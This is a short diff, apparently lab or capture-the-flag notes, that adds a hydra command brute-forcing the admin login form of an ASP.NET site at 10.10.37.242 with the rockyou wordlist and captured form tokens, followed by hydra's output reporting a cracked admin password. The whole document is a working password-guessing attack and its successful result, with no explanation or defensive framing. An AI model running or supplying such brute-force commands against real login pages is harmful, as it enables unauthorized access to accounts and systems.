@@ -1,0 +1,3 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.37.242 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=6Qpl4BNzq%2BQIvMubXh2uopSvRuv5f12M89N1oiVCc27f54nZFehpq2sAbHyFD6HeceZZoPrO%2FUyWS6gH4I1y37xPDIrvBpkPGUqCkdXeQyN1mFfARRJNSBefCQakXH37QLA%2Flw%2BwtdsSAIY4ub%2F3TtH1%2Br4f2e24OmNcYeh3GqY48cYO&__EVENTVALIDATION=s9DMm%2BDemAoNXEUmyBtfllDxFzYZxgg2kyUFwx43%2FynqcUEtlJGdH3F12Yn4tnXhi%2BUtg0SyylksDrrAiBvH3zk6r5DcuV8ucrUIckzbFyxkaAXbgSUSAKOvDLf8oVt%2BRsFrpBXQujWWgbmPlz2sUCQaF9yGTjheWquQEqJXVl07CA0p&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
+
+[80][http-post-form] host: 10.10.37.242   login: admin   password: 1qaz2wsx
